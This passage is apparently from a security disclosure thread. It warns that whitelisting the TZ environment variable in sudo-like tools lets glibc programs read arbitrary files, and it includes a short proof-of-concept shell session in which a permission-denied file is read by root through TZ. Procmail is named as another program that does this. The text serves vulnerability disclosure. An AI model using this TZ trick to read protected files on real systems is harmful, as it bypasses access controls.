This is a bad idea on glibc systems, where TZ can be abused to trick the  program to read an arbitrary file. PoC:  $ echo moo > tz $ chmod 0 tz $ cat tz cat: tz: Permission denied $ TZ=$PWD/tz sudo -u root strace -e read date read(3, = read(3, "moo\n",                  = 4 read(3, "",                       = 0 Wed Oct 15  +++ exited with 0 +++   Procmail is another program that recklessly whitelists TZ[2].
